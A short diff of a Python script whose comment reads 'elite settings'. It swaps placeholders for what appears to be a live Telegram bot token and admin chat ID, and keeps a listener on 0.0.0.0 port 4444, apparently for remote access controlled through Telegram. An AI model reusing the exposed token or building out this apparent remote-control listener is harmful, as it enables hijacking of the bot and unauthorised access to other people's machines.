@@ -2,8 +2,8 @@ import socket, threading, telebot, os
 from telebot import types
 
 # --- إعدادات النخبة ---
-BOT_TOKEN = "YOUR_BOT_TOKEN"
-ADMIN_ID = "YOUR_CHAT_ID"
+BOT_TOKEN = "8579070794:AAFhYS0DhMAfsA52b44qyf2LC-9jdsa9lD0"
+ADMIN_ID = "7918211228"
 LHOST = "0.0.0.0"
 LPORT = 4444
 
